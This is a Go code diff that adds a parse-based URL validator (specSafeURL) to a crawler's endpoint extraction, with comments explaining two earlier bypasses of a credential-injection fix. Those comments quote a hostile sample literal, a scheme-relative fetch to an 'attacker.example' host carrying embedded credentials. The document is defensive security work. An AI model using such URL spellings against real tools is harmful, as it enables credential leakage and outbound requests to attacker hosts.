@@ -64,7 +64,7 @@ func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.Observ
 		}
 		req.URL = resolveURL(ep.URL, base)
 
-		// SEC-BE-001 (third pass): validate the RESOLVED URL — the value that
+		// SEC-BE-001 / SEC-BE-002: validate the RESOLVED URL — the value that
 		// actually reaches every sink — not the pre-resolution literal.
 		//
 		// The previous fix gated ExtractedEndpoint.URL inside ExtractFromBundle and
@@ -88,13 +88,11 @@ func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.Observ
 		// endpoints, QUAL-001), and it cannot be bypassed by any spelling that
 		// resolution turns into an absolute URL.
 		//
-		// Only credential/scheme/host VALIDITY is enforced here. Same-origin remains
-		// a concat-only policy in extractConcatEndpoints — see the note there for
-		// why AST literals must keep cross-origin recall.
-		if crawl.IsAbsoluteHTTPURL(req.URL) {
-			if _, ok := crawl.ValidateFullURL(req.URL); !ok {
-				continue
-			}
+		// Only credential/scheme/host VALIDITY and the byte policy are enforced here.
+		// Same-origin remains a concat-only policy in extractConcatEndpoints — see
+		// the note there for why AST literals must keep cross-origin recall.
+		if !specSafeURL(req.URL) {
+			continue
 		}
 
 		// Synthesize JSON body when BodyFields are present.
@@ -151,4 +149,57 @@ func synthBody(fields []string) []byte {
 		return nil
 	}
 	return b
+}
+
+// specSafeURL reports whether a synthesized URL may be emitted. It is the single
+// gate for every producer, applied in toRequests to the RESOLVED URL.
+//
+// Deliberately parse-based, with NO string-prefix test anywhere. That is the
+// structural lesson from two successive bypasses of this gate: both were
+// spellings that a `strings.HasPrefix(raw, "http://")`-style check classified as
+// "not absolute" while url.Parse — and therefore every consumer downstream —
+// disagreed.
+//
+//   - First bypass: the gate ran on the pre-resolution literal, so
+//     `fetch("//u:p@attacker.example/api/collect")` skipped it and resolveURL's
+//     base.ResolveReference then copied ref.User and inherited the base scheme.
+//   - Second bypass: with the gate moved onto the resolved value, the same literal
+//     still skipped it whenever the capture's own bundle URL was empty, because
+//     resolveURL returns the literal UNCHANGED when base is nil — leaving it
+//     scheme-relative, which the prefix test also does not match, even though
+//     url.Parse reads Host="attacker.example" User=u:p from it.
+//
+// Asking url.Parse directly removes the whole class: whatever the spelling, if the
+// parsed form carries userinfo it is rejected, and if it carries a host it must be
+// http(s).
+//
+// Three rules:
+//  1. Byte policy (crawl.IsPrintableASCIIURL) — no raw non-ASCII or control bytes
+//     and no percent-escape decoding to them, so a hostile bundle cannot make a
+//     spec path key or servers entry render differently from its bytes
+//     (SEC-BE-002). Applied to all producers here; the concat producer's own
+//     cleanConcatPath check is a stricter subset.
+//  2. No userinfo, however spelled — this is the credential-injection sink:
+//     ssrf.ValidateURL never inspects u.User and probe.Config.AuthHeaders is set
+//     by no non-test caller, so net/http would derive `Authorization: Basic` from
+//     req.URL.User on every probe (SEC-BE-001).
+//  3. A URL that carries a host must be http or https. This catches the
+//     scheme-relative form (host set, scheme empty) and any other scheme that
+//     reached this point. A purely relative path (no host, no scheme) is fine and
+//     is the common case.
+func specSafeURL(raw string) bool {
+	if !crawl.IsPrintableASCIIURL(raw) {
+		return false
+	}
+	u, err := url.Parse(raw)
+	if err != nil {
+		return false
+	}
+	if u.User != nil {
+		return false
+	}
+	if u.Host != "" && u.Scheme != "http" && u.Scheme != "https" {
+		return false
+	}
+	return true
 }
